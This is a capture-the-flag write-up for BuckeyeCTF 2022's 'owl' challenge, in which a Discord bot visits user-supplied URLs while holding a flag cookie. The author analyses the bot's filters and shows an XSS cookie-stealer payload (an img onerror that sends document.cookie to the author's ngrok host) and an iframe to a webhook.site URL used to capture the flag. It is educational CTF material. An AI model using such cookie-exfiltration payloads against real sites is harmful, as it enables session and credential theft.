# owl

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

> This bird never goes ANYWHERE without its flag, but is your site hootin' enough? `owl#9960`

> Author: gsemaj

> Difficulty: Beginner

## Find the flag

**In this challenge, we can download a file:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104231049.png)

**`index.js`:**
```js
const discord = require("discord.js");
const Browser = require("zombie");

const client = new discord.Client();
client.login(process.env.DISCORD_TOKEN);

const browser = new Browser();

function fly(url, content) {
	let bad = /<script[\s\S]*?>[\s\S]*?<\/script>/gi;

	return new Promise((resolve, reject) => {
		if(content.match(bad)) {
			resolve("hoot hoot!! >:V hoot hoot hoot hoot");
			return;
		}
	
		if(content.includes("cookie")) {
			resolve("hoooot hoot hoot hoot hoot hoot");
			return;
		}
	
		browser.visit(url, () => {
			let html = browser.html();
			if(html.toLowerCase().includes("owl")) {
				resolve("✨🦉 hoot hoot 🦉✨");
			} else {
				resolve("");
			}
		});
	})
}

function scout(url, host) {
	return new Promise((resolve, reject) => {
		if(!url.includes("owl")) {
			resolve("hoot... hoot hoot?");
			return;
		}

		browser.setCookie({
			name: "flag",
			domain: host,
			value: process.env.FLAG
		});

		browser.fetch(url).then(r => {
			return r.text();
		}).then(t => {
			return fly(url, t);
		}).then(m => {
			resolve(m);
		});
	});
}

client.on("ready", () => {
	console.log("Logged in as " + client.user.tag);
});

client.on("message", msg => {
	if(!(msg.channel instanceof discord.DMChannel))
		return;

	let url = /https?:\/\/(www\.)?([-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b)([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/i
	let match = msg.content.match(url);
	if(match) {
		scout(match[0], match[2]).then(res => {
			if(res.length > 0) {
				msg.channel.send(res);
			}
		});
	} else {
		if(msg.content.toLowerCase().includes("owl") || msg.mentions.has(client.user.id)) {
			msg.channel.send("✨🦉 hoot hoot 🦉✨");
		}
	}
});
```

**At the first glance, I saw `require("discord.js");`, which means we're dealing with a Discord bot!**

**Also, at a high level overview, it'll reach to a website where we give to the bot.**

**Webhook:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104231257.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104231320.png)

**Let's dive deeper to the JavaScript!**

**Function `scout(url, host)`:**
```js
function scout(url, host) {
	return new Promise((resolve, reject) => {
		if(!url.includes("owl")) {
			resolve("hoot... hoot hoot?");
			return;
		}

		browser.setCookie({
			name: "flag",
			domain: host,
			value: process.env.FLAG
		});

		browser.fetch(url).then(r => {
			return r.text();
		}).then(t => {
			return fly(url, t);
		}).then(m => {
			resolve(m);
		});
	});
}
```

**In this function:**
- If the URL doesn't contain `owl`, returns `hoot... hoot hoot?`
- **If the URL contains `owl`, then set the browser cookie to `flag` value**
- The bot will try to find the next URL, and call function `fly()`

**Function `fly(url, content)`:**
```js
function fly(url, content) {
	let bad = /<script[\s\S]*?>[\s\S]*?<\/script>/gi;

	return new Promise((resolve, reject) => {
		if(content.match(bad)) {
			resolve("hoot hoot!! >:V hoot hoot hoot hoot");
			return;
		}
	
		if(content.includes("cookie")) {
			resolve("hoooot hoot hoot hoot hoot hoot");
			return;
		}
	
		browser.visit(url, () => {
			let html = browser.html();
			if(html.toLowerCase().includes("owl")) {
				resolve("✨🦉 hoot hoot 🦉✨");
			} else {
				resolve("");
			}
		});
	})
}
```

**In this function:**
- If the website contents `<script>` tag, then returns `hoot hoot!! >:V hoot hoot hoot hoot`
- If the website includes a cookie, then returns `hoooot hoot hoot hoot hoot hoot`
- The bot will visit our supplied URL, if the website contains `owl`, then returns `✨🦉 hoot hoot 🦉✨`

```js
client.on("ready", () => {
	console.log("Logged in as " + client.user.tag);
});

client.on("message", msg => {
	if(!(msg.channel instanceof discord.DMChannel))
		return;

	let url = /https?:\/\/(www\.)?([-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b)([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/i
	let match = msg.content.match(url);
	if(match) {
		scout(match[0], match[2]).then(res => {
			if(res.length > 0) {
				msg.channel.send(res);
			}
		});
	} else {
		if(msg.content.toLowerCase().includes("owl") || msg.mentions.has(client.user.id)) {
			msg.channel.send("✨🦉 hoot hoot 🦉✨");
		}
	}
});
```

In this, if the Discord bot found a URL in the direct message, it'll call `scout()` function.

**Armed with above information, we can try to build our own website!**

- First, make a `owl` directory:

```
┌──(root🌸siunam)-[~/ctf/BuckeyeCTF-2022/Web/owl]
└─# mkdir owl
```

- Then create a simple HTML page:

```
┌──(root🌸siunam)-[~/ctf/BuckeyeCTF-2022/Web/owl]
└─# cat index.html 
<html>
<title>Test</title>
<body>
	<p>Hello</p>
</body>
</html>

┌──(root🌸siunam)-[~/…/BuckeyeCTF-2022/Web/owl/owl]
└─# cat index.html 
<html>
<title>Test</title>
<body>
	<p>Owl here</p>
</body>
</html>
```

- Host the webpage:

```
┌──(root🌸siunam)-[~/ctf/BuckeyeCTF-2022/Web/owl]
└─# python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Port forwarding via `ngrok`:

```
┌──(root🌸siunam)-[~/ctf/BuckeyeCTF-2022/Web/owl]
└─# ngrok --scheme http http 80
```

```
[...]
Web Interface                 http://127.0.0.1:4040                                                        
Forwarding                    http://360c-{Redacted}.ap.ngrok.io -> http://localhost:80                
                                                                                                           
Connections                   ttl     opn     rt1     rt5     p50     p90                                  
                              0       0       0.00    0.00    0.00    0.00
```

Now, we can try to send a URL to the `owl` Discord bot:

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104233819.png)

But how do we get the flag cookie??

**We can do this via a [XSS cookie stealer payload](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md#inject-the-xss-attack-code):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104234421.png)

**Let's copy that and modify our `index.html` in `/owl`!**
```
┌──(root🌸siunam)-[~/…/BuckeyeCTF-2022/Web/owl/owl]
└─# cat index.html 
<html>
<title>Test</title>
<body>
	<p>Owl here</p>
	<img src=x onerror="this.src='http://360c-{Redacted}.ap.ngrok.io/owl/?'+document.cookie; this.removeAttribute('onerror');">
</body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104234517.png)

This time, we see it returns `hoooot hoot hoot hoot hoot hoot`, which means it included a cookie.

> Note: The reason why I didn't have the `<script>` tag is because of the `fly()` function.

**Hmm... Since the `<script>` tag is blocked, maybe we can try to use the `<iframe>` tag???** 

> Note: `<iframe>` allows the page to show other files/people's web contents.

**To do so, I'll use a online webhook service: [Webhook.site](https://webhook.site)**

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104235659.png)

That will be our iframe's source URL!

**Now, let's modify our `owl/index.html`!**
```
┌──(root🌸siunam)-[~/…/BuckeyeCTF-2022/Web/owl/owl]
└─# cat index.html 
<html>
<title>Test</title>
<body>
	<p>Owl here</p>
	<iframe src="https://webhook.site/5d93b54e-1000-4941-a358-b50e48824e09"></iframe>
</body>
</html>
```

**Then send the URL to the owl Discord bot!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104235834.png)

**Now, we should recieved a GET request in Webhook.site!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/BuckeyeCTF-2022/images/Pasted%20image%2020221104235908.png)

Boom! We got the flag!

# Conclusion

What we've learned:

1. Stealing Cookies via Discord Bot XSS